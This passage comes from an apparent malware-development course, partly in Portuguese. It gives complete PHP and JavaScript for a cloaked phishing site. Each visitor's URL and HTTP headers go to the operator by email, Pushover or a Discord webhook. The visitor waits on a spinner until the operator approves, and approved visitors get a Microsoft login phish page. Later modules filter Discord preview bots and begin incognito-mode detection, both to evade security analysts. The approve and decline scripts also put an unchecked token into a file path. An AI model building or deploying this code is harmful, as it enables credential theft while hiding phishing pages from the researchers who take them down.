    $URI_PATH = 'https://example.com/approve-access/'; // Replace with the full path to your approve and decline files
    $approveLink = $URI_PATH . 'approve.php?token=' . $token;
    $declineLink = $URI_PATH . 'decline.php?token=' . $token;

    // Add the information to the body of the email and send the email
    $mail->Body = nl2br($url . "\n\n" . $headers . "\n\nApprove: <a href=\"$approveLink\">Approve</a>\nDecline: <a href=\"$declineLink\">Decline</a>");
    $mail->send();

} catch (Exception $e) {
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```

Remember to execute `composer require phpmailer/phpmailer` in the directory where the landing page is stored, otherwise, you may encounter an HTTP 500 error when using `PHPMailer`.

### Approve And Decline
The approve and decline functionality is straightforward: both scripts check if a `token` parameter is provided in the URL query. If present, they create a decision file outside the document root in `/var/www/decisions` named `decsion_$token.txt`, where the `$token` is the user's unique token. The file's content will be either "approved" or "declined". If no token is provided, they display a 403 error page.

Note: Ensure that the directory `/var/www/decisions` exists and ensure that the web server can write to the folder. This will require you to change the ownership to `www-data` using the `sudo chown www-data:www-data /var/www/decisions` command.

approve.php

```
<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'approved');
    echo "Access approved. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```
decline.php

```
<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'declined');
    echo "Access denied. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```

### Validating Decision
The final necessary component is the `check_approval.php` file which checks the existence of a decision file associated with the user's session token. If found, it reads the decision and returns either the phishing content (`/var/www/ms-login.html`) or an HTTP 403 page (`/var/www/403.html`), and then deletes the decision file to complete the process. If no decision file is found, it indicates that the decision is still pending.

```
<?php
session_name('access_token');
session_start();

// If no token is found in the session, return no_token
if (!isset($_SESSION['token'])) {
    echo json_encode(['status' => 'no_token']);
    exit();
}

// Extract token and check for the existence of the decision_$token.txt file
$token = $_SESSION['token'];
$decisionFile = "/var/www/decisions/decision_$token.txt";

if (file_exists($decisionFile)) {
    $decision = file_get_contents($decisionFile);

    if ($decision === 'approved') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/ms-login.html'); // Serve phishing content (user was approved)
        echo json_encode(['status' => 'approved', 'content' => $content]);
    } elseif ($decision === 'declined') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/403.html'); // Serve error page (user was declined)
        echo json_encode(['status' => 'declined', 'content' => $content]);
    }
} else {
    echo json_encode(['status' => 'pending']);
}
?>

```

### Demo - Access Approved
The video can be found in folder: `./videos/access_approved-1.mp4`

The video can be found in folder: `./videos/access_approved-2.mp4`

### Demo - Access Declined
The video can be found in folder: `./videos/access_declined.mp4`

## Preventing Duplicate Requests
The previous code works as expected, however, a user can continuously refresh the page and cause multiple emails to be spammed to our inbox. To prevent this, we need to update the landing page (`landing.php`) and the `check_approval.php` files.

The landing page shown below is updated to generate a token and dispatch an email only if a session token has not already been set. This ensures that if a user repeatedly refreshes the page, only a single email is sent, and their unique token remains unchanged.

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'vendor/autoload.php';

session_name("access_token"); // Changing the default session name
session_start();

// Create a unique token if no token is set
if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
    $token = $_SESSION['token'];

    // Emailing ourselves the request information
    $mail = new PHPMailer(true);
    try {
        $EMAIL_ADDRESS = 'user@gmail.com'; // Replace with your Gmail account

        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = $EMAIL_ADDRESS;
        $mail->Password   = '1234 5678 4321 1234'; // Replace with your app password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        $mail->setFrom($EMAIL_ADDRESS, 'Maldev');
        $mail->addAddress($EMAIL_ADDRESS, 'Maldev');

        $mail->isHTML(true);
        $mail->Subject = 'New Visitor';

        // Get all the HTTP headers
        $headers = '';
        foreach (getallheaders() as $name => $value) {
            $headers .= "$name: $value\n";
        }

        // Get the URL with query parameters
        $url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

        // Prepare the approval and denial links
        $URI_PATH = 'https://example.com/approve-access/'; // Replace with the full path to your approve and decline files
        $approveLink = $URI_PATH . 'approve.php?token=' . $token;
        $declineLink = $URI_PATH . 'decline.php?token=' . $token;

        // Add the information to the body of the email and send the email
        $mail->Body = nl2br($url . "\n\n" . $headers . "\n\nApprove: <a href=\"$approveLink\">Approve</a>\nDecline: <a href=\"$declineLink\">Decline</a>");
        $mail->send();

    } catch (Exception $e) {
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000); // Poll again after 2 seconds
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```
The `check_approval.php` file will now destroy the session after an approval or denial. This ensures that a new email is sent only after a decision has been made to approve or deny the user.

```
<?php
session_name('access_token');
session_start();

if (!isset($_SESSION['token'])) {
    echo json_encode(['status' => 'no_token']);
    exit();
}

$token = $_SESSION['token'];
$decisionFile = "/var/www/decisions/decision_$token.txt";

if (file_exists($decisionFile)) {
    $decision = file_get_contents($decisionFile);

    if ($decision === 'approved') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/ms-login.html'); // Serve approved content
        echo json_encode(['status' => 'approved', 'content' => $content]);

        // Destroy session
        session_unset();
        session_destroy();
    } elseif ($decision === 'declined') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/403.html'); // Serve declined content
        echo json_encode(['status' => 'declined', 'content' => $content]);

        // Destroy session
        session_unset();
        session_destroy();
    }
} else {
    echo json_encode(['status' => 'pending']);
}
?>

```

### Demo
Regardless of how many times the user reloads the page, only a single email will be sent until a decision is made by us.

The video can be found in folder: `./videos/demo-2-approve-via-email.mp4`

## Objetivos
In addition to HTTP headers, send client-side telemetry (e.g. navigator properties) to make a more informed decision before accepting or rejecting a client

If a user is rejected once, log their IP address and permanently serve them an HTTP 403 page

Automatically block clients that are definitively identified as bots


---

# Module 55 - Anti-Analysis Approve Access Via Push Notifications

Módulo 55 — Anti-Analysis Approve Access Via Push Notifications

- # Module 55 - Anti-Analysis Approve Access Via Push Notifications

# Disclaimer
# Módulo 55 — Anti-Análise: Aprovação de Acesso Via Push Notifications

## Introdução
In the previous module, we implemented a system where you were notified via email whenever a user accessed the website. This notification provided an option to either approve or decline the user's ability to view the phishing content. In this module, we will modify that functionality by delivering the notification via a mobile push notification, offering a more immediate and convenient way to manage access.This module will guide you through the process of using Pushover to send push notifications directly to a mobile device. To follow along, you'll first need to create an account on Pushover, which will allow you to connect your mobile device and use it to receive push notifications.
## Pushover Setup
As previously stated, we will be using Pushover to send push notifications. The first step is to create a Pushover account. Once the account is created and the email is verified, the next task is to install the Pushover mobile application on your device.Once you have installed the app, log in using your credentials and link your device to the newly created Pushover account. After successfully connecting your device, navigate back to the dashboard on pushover.net to verify that your device is registered and ready to receive notifications.
### Application Creation
One final requirement before using the Pushover API is to create an application. This step is essential because you will need the application key, along with your user key, to send push notifications.With the application successfully created, we can test out a push notification using the following PHP script.
Make sure you have `php-curl` installed using `sudo apt-get install php-curl`.

```
<?php
$ch = curl_init();

curl_setopt_array($ch, array(
    CURLOPT_URL => "https://api.pushover.net/1/messages.json",
    CURLOPT_POSTFIELDS => array(
        "token" => "application_token", // Replace this with your application's token
        "user" => "user_key", // Replace this with your user key that's found on the dashboard
        "message" => "Test",
        "priority" => 1,
        "title" => "Test"
    ),
    CURLOPT_RETURNTRANSFER => true,
));
curl_exec($ch);
curl_close($ch);

?>

```

## Visão Geral da Implementação
With the prerequisites satisfied, we move on to the implementation of the push notification approval system. The implementation shown in the module will be as follows:
When a user attempts to access our phishing website, a push notification is sent to us that contains the URL, the associated HTTP headers, and two links to either approve or deny access.

- The push notification is sent using the Pushover API, and it contains the unique token for the user session, embedded in both the approval and denial links.

- The user is kept on a waiting page while the system awaits for an approval or denial decision.

- Clicking the approval or denial link sends the token back to the server, where the decision is stored in a user-specific file located outside the document root. The file will be named in the format `decision_$token.txt`.

- Once the decision is made and the unique file is generated, the file is read and then deleted.

- If approval was given, the user is shown the phishing content stored in `/var/www/ms-login.html`. Otherwise, if the user was denied they will be shown `/var/www/403.html`.

- If no action is taken, the user remains on the waiting page, with the system polling for an action until a decision is made or until the page times out.

### Página de Landing
To start, we will create a landing page designed to be sent to the target user. This landing page will serve as the entry point for the session management process, beginning by establishing a session variable named `push_token`. A unique token will be generated for each session, ensuring tracking and identification.

```
<?php

session_name("push_token");
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

// ...
// ...

```
Once the token is created, a push notification will be dispatched containing the following elements: the URL of the landing page along with any query parameters, the HTTP headers, and the approval and denial links. These links will correspond to `approve.php` and `decline.php`, respectively. The unique token generated for the session will be appended to these links as a query parameter, allowing the system to process the decision for the user associated with the token.

The `$URI_PATH` path must be set to the correct domain and path.

```
<?php

$headers = '';
foreach (getallheaders() as $name => $value) {
    $headers .= "$name: $value\n";
}

$url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$URI_PATH = 'https://example.com/approve-access/';
$approveLink = $URI_PATH . 'approve.php?token=' . $token;
$declineLink = $URI_PATH . 'decline.php?token=' . $token;

$message = $url . "\n\n" . $headers . "\n\nApprove: " . $approveLink . "\nDecline: " . $declineLink;

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://api.pushover.net/1/messages.json",
    CURLOPT_POSTFIELDS => array(
        "token" => "app_token",
        "user" => "user_key",
        "message" => $message,
        "priority" => 1,
        "title" => "New Visitor"
    ),
    CURLOPT_RETURNTRANSFER => true,
));
curl_exec($ch);
curl_close($ch);

// ...
// ...

```
To ensure a smooth user experience, an HTML/CSS-based spinner is implemented on the landing page. This visual element will give the user the impression that the page is actively loading, enhancing the interaction flow while the session and token processing occur in the background. The final element of the landing page involves utilizing the Fetch API to repeatedly poll `check_approval.php` to determine if a decision has been made.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```
The complete code for the landing page is shown below.

landing.php

```
<?php

session_name("push_token");
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

$headers = '';
foreach (getallheaders() as $name => $value) {
    $headers .= "$name: $value\n";
}

$url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$URI_PATH = 'https://example.com/approve-access';
$approveLink = $URI_PATH . 'approve.php?token=' . $token;
$declineLink = $URI_PATH . 'decline.php?token=' . $token;

$message = $url . "\n\n" . $headers . "\n\nApprove: " . $approveLink . "\nDecline: " . $declineLink;

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://api.pushover.net/1/messages.json",
    CURLOPT_POSTFIELDS => array(
        "token" => "app_token",
        "user" => "user_key",
        "message" => $message,
        "priority" => 1,
        "title" => "New Visitor"
    ),
    CURLOPT_RETURNTRANSFER => true,
));
curl_exec($ch);
curl_close($ch);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```

### Approve And Decline
The approve and decline functionality will remain unchanged as both scripts check if a `token` parameter is provided in the URL query. If present, they create a decision file outside the document root in `/var/www/decisions` named `decsion_$token.txt`, where the `$token` is the user's unique token. The file's content will be either "approved" or "declined". If no token is provided, they display a 403 error page.

Note: Ensure that the directory `/var/www/decisions` exists and ensure that the web server can write to the folder. This will require you to change the ownership to `www-data` using the `sudo chown www-data:www-data /var/www/decisions` command.

approve.php

```
<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'approved');
    echo "Access approved. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```
decline.php

```
<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'declined');
    echo "Access denied. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```

### Validating Decision
The final component is the `check_approval.php` file which checks the existence of a decision file associated with the user's session token. If found, it reads the decision and returns either the phishing content (`/var/www/ms-login.html`) or an HTTP 403 page (`/var/www/403.html`), and then deletes the decision file to complete the process. If no decision file is found, it indicates that the decision is still pending.

```
<?php
session_name('push_token');
session_start();

// If no token is found in the session, return no_token
if (!isset($_SESSION['token'])) {
    echo json_encode(['status' => 'no_token']);
    exit();
}

// Extract token and check for the existence of the decision_$token.txt file
$token = $_SESSION['token'];
$decisionFile = "/var/www/decisions/decision_$token.txt";

if (file_exists($decisionFile)) {
    $decision = file_get_contents($decisionFile);

    if ($decision === 'approved') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/ms-login.html'); // Serve phishing content (user was approved)
        echo json_encode(['status' => 'approved', 'content' => $content]);
    } elseif ($decision === 'declined') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/403.html'); // Serve error page (user was declined)
        echo json_encode(['status' => 'declined', 'content' => $content]);
    }
} else {
    echo json_encode(['status' => 'pending']);
}
?>

```

## Demo
The video can be found in folder: `./videos/demo-approve-via-push.mp4`

## Conclusão
Using a mobile device to approve or decline access is a convenient method, and push notifications can alert you when someone is trying to access the phishing website. It's important to manage rate limiting when utilizing APIs like the Pushover API to prevent service disruptions. There are various strategies to implement rate limiting, including queuing requests, which we leave for the reader to implement.

## Objetivos
In addition to HTTP headers, send client-side telemetry (e.g. navigator properties) to make a more informed decision before accepting or rejecting a client

Optional: Use SMS messages instead of the Pushover application


---

# Module 56 - Anti-Analysis Approve Access Via Discord

Módulo 56 — Anti-Analysis Approve Access Via Discord

- # Module 56 - Anti-Analysis Approve Access Via Discord

# Disclaimer
# Módulo 56 — Anti-Análise: Aprovação de Acesso Via Discord

## Introdução
Another reliable method of receiving notifications when a user accesses our phishing website is Discord. The Discord API can be used to send our server an automated message with the URL, HTTP headers, and approve and decline links.
## Discord Setup
This module requires a Discord account in order to use their API. Once an account is setup, download the Discord application or login via the web interface and follow the steps below:Start by creating a new server by clicking the "+" icon on the left sidebar then click "Create My Own" > "For me and my friends".Once the server is created, right-click the server's icon on the left sidebar and select "Server Settings" > "Integrations".The final step is to create a webhook and then click "Copy Webhook URL". The webhook URL should be saved somewhere as it will be used later in our scripts.
## Visão Geral da Implementação
With the prerequisites satisfied, we move on to the implementation of the Discord notification approval system. The implementation shown in the module will be as follows:
When a user attempts to access our phishing website, a Discord message is sent to our server that contains the URL, the associated HTTP headers, and two links to either approve or deny access.

- The push notification is sent using the Discord API, and it contains the unique token for the user session, embedded in both the approval and denial links.

- The user is kept on a waiting page while the system awaits for an approval or denial decision.

- Clicking the approval or denial link sends the token back to the server, where the decision is stored in a user-specific file located outside the document root. The file will be named in the format `decision_$token.txt`.

- Once the decision is made and the unique file is generated, the file is read and then deleted.

- If approval was given, the user is shown the phishing content stored in `/var/www/ms-login.html`. Otherwise, if the user was denied they will be shown `/var/www/403.html`.

- If no action is taken, the user remains on the waiting page, with the system polling for an action until a decision is made or until the page times out.

### Página de Landing
To start, we will create a landing page designed to be sent to the target user. This landing page will serve as the entry point for the session management process, beginning by establishing a session variable named `bot_token`. A unique token will be generated for each session, ensuring tracking and identification.

```
<?php

session_name("bot_token");
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

// ...
// ...

```
Once the token is created, a push notification will be dispatched containing the following elements: the URL of the landing page along with any query parameters, the HTTP headers, and the approval and denial links. These links will correspond to `approve.php` and `decline.php`, respectively. The unique token generated for the session will be appended to these links as a query parameter, allowing the system to process the decision for the user associated with the token.

```
<?php
// ...
// ...

$headers = '';
foreach (getallheaders() as $name => $value) {
    $headers .= "$name: $value\n";
}

$url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$URI_PATH = 'https://example.com/';
$approveLink = $URI_PATH . 'approve.php?token=' . $token;
$declineLink = $URI_PATH . 'decline.php?token=' . $token;

$message = $url . "\n\n" . $headers . "\n\nApprove: " . $approveLink . "\nDecline: " . $declineLink;

// Replace this with your Webhook URL
$WEBHOOK_URL = "https://discord.com/api/webhooks/12345";

$data = json_encode([
    "content" => $message,
    "username" => "Approval Bot",
]);

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => $WEBHOOK_URL,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
    ],
    CURLOPT_RETURNTRANSFER => true,
));
$response = curl_exec($ch);
curl_close($ch);
?>

// ...
// ...

```
To ensure a smooth user experience, an HTML/CSS-based spinner is implemented on the landing page. This visual element will give the user the impression that the page is actively loading, enhancing the interaction flow while the session and token processing occur in the background. The final element of the landing page involves utilizing the Fetch API to repeatedly poll `check_approval.php` to determine if a decision has been made.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```
The complete landing page is shown below.

Note: The webhook URL created earlier in the module needs to be placed in the `$WEBHOOK_URL` variable. Additionally, ensure `$URI_PATH` path is set to the correct domain and path.

```
<?php

session_name("bot_token");
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

$headers = '';
foreach (getallheaders() as $name => $value) {
    $headers .= "$name: $value\n";
}

$url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$URI_PATH = 'https://example.com/approve-access/';
$approveLink = $URI_PATH . 'approve.php?token=' . $token;
$declineLink = $URI_PATH . 'decline.php?token=' . $token;

$message = $url . "\n\n" . $headers . "\n\nApprove: " . $approveLink . "\nDecline: " . $declineLink;

// Replace this with your Webhook URL
$WEBHOOK_URL = "https://discord.com/api/webhooks/12345";

$data = json_encode([
    "content" => $message,
    "username" => "Approval Bot",
]);

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => $WEBHOOK_URL,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
    ],
    CURLOPT_RETURNTRANSFER => true,
));
$response = curl_exec($ch);
curl_close($ch);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```

### Approve And Decline
The approve and decline functionality will remain unchanged as both scripts check if a `token` parameter is provided in the URL query. If present, they create a decision file outside the document root in `/var/www/decisions` named `decsion_$token.txt`, where the `$token` is the user's unique token. The file's content will be either "approved" or "declined". If no token is provided, they display a 403 error page.

Note: Ensure that the directory `/var/www/decisions` exists and ensure that the web server can write to the folder. This will require you to change the ownership to `www-data` using the `sudo chown www-data:www-data /var/www/decisions` command.

approve.php

```
<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'approved');
    echo "Access approved. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```
decline.php

```
<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'declined');
    echo "Access denied. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```

### Validating Decision
The final component is the `check_approval.php` file which checks the existence of a decision file associated with the user's session token. If found, it reads the decision and returns either the phishing content (`/var/www/ms-login.html`) or an HTTP 403 page (`/var/www/403.html`), and then deletes the decision file to complete the process. If no decision file is found, it indicates that the decision is still pending.

```
<?php
session_name('bot_token');
session_start();

// If no token is found in the session, return no_token
if (!isset($_SESSION['token'])) {
    echo json_encode(['status' => 'no_token']);
    exit();
}

// Extract token and check for the existence of the decision_$token.txt file
$token = $_SESSION['token'];
$decisionFile = "/var/www/decisions/decision_$token.txt";

if (file_exists($decisionFile)) {
    $decision = file_get_contents($decisionFile);

    if ($decision === 'approved') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/ms-login.html'); // Serve phishing content (user was approved)
        echo json_encode(['status' => 'approved', 'content' => $content]);
    } elseif ($decision === 'declined') {
        unlink($decisionFile);
        $content = file_get_contents('/var/www/403.html'); // Serve error page (user was declined)
        echo json_encode(['status' => 'declined', 'content' => $content]);
    }
} else {
    echo json_encode(['status' => 'pending']);
}
?>

```

### Filtering Discord Bots
The code works as expected, but there's an issue: when our URL is sent to Discord, the Discord bot attempts to access it to generate a preview, leading to unnecessary spam messages and the possibility that the Discord bot accesses our approve or decline URLs.

To resolve this, we'll modify our landing page and approve and decline files to check if the user agent contains "Discordbot" and halt the execution accordingly. The updated landing page is shown below:

Updated version of landing.php

```
<?php

// If it's Discordbot, stop execution and don't send the webhook
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($userAgent, 'Discordbot') !== false) {
    exit;
}

session_name("bot_token");
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

$headers = '';
foreach (getallheaders() as $name => $value) {
    $headers .= "$name: $value\n";
}

$url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$URI_PATH = 'https://example.com/approve-access/';
$approveLink = $URI_PATH . 'approve.php?token=' . $token;
$declineLink = $URI_PATH . 'decline.php?token=' . $token;

$message = $url . "\n\n" . $headers . "\n\nApprove: " . $approveLink . "\nDecline: " . $declineLink;

// Replace this with your Webhook URL
$WEBHOOK_URL = "https://discord.com/api/webhooks/12345";

$data = json_encode([
    "content" => $message,
    "username" => "Approval Bot",
]);

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => $WEBHOOK_URL,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
    ],
    CURLOPT_RETURNTRANSFER => true,
));
$response = curl_exec($ch);
curl_close($ch);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```
approve.php

```
<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($userAgent, 'Discordbot') !== false) {
    exit;
}

if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'approved');
    echo "Access approved. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```
decline.php

```
<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($userAgent, 'Discordbot') !== false) {
    exit;
}

if (isset($_GET['token'])) {
    $token = $_GET['token'];
    file_put_contents("/var/www/decisions/decision_$token.txt", 'declined');
    echo "Access denied. You can now close this window.";
} else {
    http_response_code(403);
    readfile("/var/www/403.html");
}
?>

```

## Demo
The video can be found in folder: `./videos/demo-approve-via-discord.mp4`

## Objetivos
In addition to HTTP headers, send client-side telemetry (e.g. navigator properties) to make a more informed decision before accepting or rejecting a client

Optional: Use SMS messages instead of the Pushover application


---

# Módulo 57 — Detecção de Modo Incógnito

Módulo 57 — Incognito Mode Detection

- # Módulo 57 — Detecção de Modo Incógnito

# Disclaimer

## Introdução
Accessing a phishing site in incognito mode may indicate an analysis attempt that should be blocked since users will generally access websites without incognito or private mode. This module covers setting up the detectIncognito JavaScript library to detect incognito mode in popular browsers.
## Lógica de Detecção
The library determines the browser type by analyzing the user agent via the `navigator.userAgent` property and evaluating how it handles specific JavaScript operations. For example, the `feid` function uses the operation `eval("(-1).toFixed(-1);")` to see the length of the error message. Depending on the length, it determines the browser. The values `44`, `51`, and `25` correspond to Safari, Chrome, and Firefox, respectively.
```
function feid() {
    var toFixedEngineID = 0;
    try {
        eval("(-1).toFixed(-1);");
    } catch (e) {
        toFixedEngineID = e.message.length;
    }
    return toFixedEngineID;
}

function isSafari() {
    return 44 === feid();
}

function isChrome() {
    return 51 === feid();
}

function isFirefox() {
    return 25 === feid();
}

```
